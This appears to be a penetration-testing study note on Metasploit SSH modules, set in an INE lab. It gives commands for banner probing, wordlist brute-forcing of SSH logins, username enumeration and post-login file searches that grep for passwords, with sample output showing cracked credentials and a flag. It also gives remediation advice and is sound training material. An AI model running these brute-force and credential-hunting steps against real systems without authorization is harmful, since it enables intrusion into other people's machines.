# Metasploit - SSH Enumeration Modules (Detailed)

**Path:** `service-enumeration/ssh/metasploit.md`

## Purpose
Notes for Metasploit auxiliary modules used to enumerate SSH services, collect banner and algorithm information, test authentication, and manage sessions after successful logins.
Keep this file in your repo as a reference for SSH-focused reconnaissance and initial access steps.

## Where to save
`service-enumeration/ssh/metasploit.md`

## Key modules / usage
- `auxiliary/scanner/ssh/ssh_version` — probe SSH banner and list supported algorithms and host keys.
- `auxiliary/scanner/ssh/ssh_login` — brute-force or test credentials from wordlists.
- `auxiliary/scanner/ssh/ssh_enumusers` — enumerate possible usernames (if available).
- `auxiliary/scanner/ssh/ssh_known_hosts` — check/collect host keys (fingerprints).
- `post/multi/manage/ssh` and `sessions` — manage shells and post-exploitation actions.
- CLI tools: `ssh`, `ssh-keyscan`, `ssh-keygen`, `sftp` for manual follow-up.

---

## Quick examples
```bash
# Start msfconsole quietly
msfconsole -q

# SSH version probe
use auxiliary/scanner/ssh/ssh_version
set RHOSTS demo.ine.local
run

# SSH login brute-force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/wordlists/common_users.txt
set PASS_FILE /usr/share/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
run

# Collect host keys
use auxiliary/scanner/ssh/ssh_known_hosts
set RHOSTS demo.ine.local
run
```

---

## How to read common output
- `SSH server version:` line shows product and version (e.g. `OpenSSH_7.9p1`). Use for CVE checks.
- `encryption.*` lines show key-exchange, cipher, MAC, and host-key algorithms.
- `Key Fingerprint:` shows host key fingerprint. Save for reporting and SSH fingerprint pinning.
- `Success: 'user:pass'` denotes valid credentials.
- `SSH session X opened` shows an interactive session ID you can attach to with `sessions -i X`.

---

## Practical tips
- Run `ssh_version` before `ssh_login`. The banner and algorithms help choose follow-ups.
- Use focused username lists from OSINT or other enumerations to reduce noise.
- Set `STOP_ON_SUCCESS` to limit brute-force duration when hunting for a single valid account.
- Avoid high thread counts on production systems. Start with `THREADS 1-4` then increase carefully in labs.
- Save msfconsole logs (`spool`) and loot files for evidence. Record timestamps and RHOSTS.
- When you get a shell, do non-destructive enumeration first (whoami, id, uname -a, ps aux, env).

---

# Module details (expanded)

## ssh_version — Probe banner and algorithms
**Module**
```
auxiliary/scanner/ssh/ssh_version
```
**Purpose (short)**  
Connect to SSH port and collect server banner, supported algorithms, and host key fingerprint.

**Important options**
- `RHOSTS` — target host(s)
- `RPORT` — default 22
- `THREADS` — parallelism

**What it does**
- Establishes an SSH handshake and records server-response fields such as Server version, KEX, cipher lists, MACs, and host key types and fingerprints.

**Typical output**
```
[*] 192.61.134.3 - Key Fingerprint: ssh-ed25519 AAAAC3Nza...
[*] 192.61.134.3 - SSH server version: SSH-2.0-OpenSSH_7.9p1 Ubuntu-10
[*] encryption.encryption    aes128-ctr, aes256-gcm@openssh.com, ...
[*] encryption.hmac          hmac-sha2-256, hmac-sha2-512, ...
[*] encryption.host_key      ssh-ed25519, rsa-sha2-256, ecdsa-sha2-nistp256
```
**Interpretation**
- Banner reveals product and possibly OS hint. Algorithms show whether weak ciphers or legacy host keys are supported.

**Follow-ups**
- Check for weak host key types (rsa/sha1) and weak KEX (diffie-hellman-group1). Report them.
- Use `ssh-keyscan` to corroborate host key fingerprints.
- If banner shows old OpenSSH, search CVEs for that version.

**Remediation**
- Disable weak algorithms and host keys. Keep OpenSSH up to date. Enforce strong KEX and ciphers.

---

## ssh_login — Brute-force and credential testing
**Module**
```
auxiliary/scanner/ssh/ssh_login
```
**Purpose (short)**  
Attempt authentication using username/password lists. Optionally test single username/password pairs.

**Important options**
- `RHOSTS`, `USER_FILE`, `PASS_FILE`, `USERPASS_FILE`
- `STOP_ON_SUCCESS` — stop after first success
- `THREADS`, `VERBOSE`

**What it does**
- Iterates over username/password combinations. Reports successful authentications and may open an interactive session.

**Typical output**
```
[-] 192.61.134.3:22 - Failed: 'sysadmin:tolkien'
[+] 192.61.134.3:22 - Success: 'sysadmin:hailey'
[*] SSH session 1 opened (192.61.134.2:42819 -> 192.61.134.3:22)
```
**Interpretation**
- Valid credential discovered. Note account name and context. A session opening indicates an interactive shell or channel.

**Cautions**
- Brute-force is noisy. Use only authorized targets. Watch for account lockouts and detection systems.

**Tuning tips**
- Use targeted user lists. Use `STOP_ON_SUCCESS true` when hunting single accounts.
- Consider using `USERPASS_FILE` for known pairs to reduce attempts.

**Follow-ups**
- Attach to session (`sessions -i <id>`) and perform safe enumeration.
- Check for SSH key-based auth and user's `~/.ssh/authorized_keys` for key reuse.

**Remediation**
- Enforce rate limits and fail2ban-like protections. Use MFA and strong passwords.

---

## ssh_enumusers — Username enumeration
**Module**
```
auxiliary/scanner/ssh/ssh_enumusers
```
**Purpose (short)**  
Probe for valid usernames via SSH protocol behaviors or error messages. Not all servers leak info.

**Important options**
- `RHOSTS`, `USER_FILE`, `THREADS`

**What it does**
- Attempts connection flows that may reveal user existence (varies by server).

**Typical output**
```
[+] Found valid user: sysadmin
```
**Caveats**
- Modern OpenSSH often returns generic errors. False positives/negatives are possible.

**Follow-ups**
- Correlate results with other sources (web app users, LDAP, git commits).

**Remediation**
- Configure SSH to avoid revealing user existence. Use consistent error messages and rate limiting.

---

## ssh_known_hosts — Collect and verify host keys / fingerprints
**Module**
```
auxiliary/scanner/ssh/ssh_known_hosts
```
**Purpose (short)**  
Gather host keys from multiple targets to build a known_hosts inventory and detect changes or duplicate keys.

**Important options**
- `RHOSTS`, `RPORT`

**What it does**
- Connects and records host key types and fingerprints. Can compare duplicates across hosts.

**Typical output**
```
[+] 192.61.134.3 - ssh-rsa SHA256:... (key saved)
```
**Interpretation**
- Matching host keys across multiple IPs may indicate load balancers, NAT, or cloned images. Unexpected changes can indicate MITM.

**Follow-ups**
- Save fingerprints for reporting and detection. Cross-check with `ssh-keyscan` output.

**Remediation**
- Rotate keys when compromised. Use proper key management.

---

## Managing sessions and post-login steps (post-exploitation)
**Commands**
- List sessions:
```
sessions
```
- Interact with session:
```
sessions -i <id>
```
- Background and manage:
```
background
sessions -k <id>
```
**Safe initial commands to run inside shell**
```
whoami
id
uname -a
cat /etc/os-release
ps aux --no-heading | head -n 30
ls -la ~/
```
**File search examples**
```
find / -name "flag" 2>/dev/null
grep -R "password" /home 2>/dev/null
```
**Notes**
- Preserve evidence. Avoid destructive actions. Record timestamps and output. Export files via `scp` or `sftp` when needed.

---

## INE lab example (complete SSH workflow)
### Input
```bash
# Version probe
use auxiliary/scanner/ssh/ssh_version
set RHOSTS demo.ine.local
run

# Brute-force login
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
run

# Collect host keys
use auxiliary/scanner/ssh/ssh_known_hosts
set RHOSTS demo.ine.local
run
```

### Output (aggregated)
```
[*] 192.61.134.3 - Key Fingerprint: ssh-ed25519 AAAAC3Nza...
[*] 192.61.134.3 - SSH server version: SSH-2.0-OpenSSH_7.9p1 Ubuntu-10
[-] 192.61.134.3:22 - Failed: 'sysadmin:yourface'
[+] 192.61.134.3:22 - Success: 'sysadmin:hailey'
[*] SSH session 1 opened (192.61.134.2:42819 -> 192.61.134.3:22)
find: '/root': Permission denied
/flag
eb09cc6f1cd72756da145892892fbf5a
```

### Short analysis and next steps
- OpenSSH 7.9p1 detected. Check CVEs and weak algorithms like `ssh-rsa` if present.
- Found valid credentials `sysadmin:hailey`. Attach to session and perform safe enumeration.
- Host key fingerprint recorded for reporting.
- Next: search for sensitive files, check sudo privileges, and attempt privilege escalation only in lab.

---

## Final checklist (report)
- [ ] Save msfconsole logs and all loot files.
- [ ] Record RHOSTS, module options, and timestamps.
- [ ] Document valid credentials and session IDs.
- [ ] List weak algorithms and recommend remediation.
- [ ] Include safe reproduction steps for reviewers.
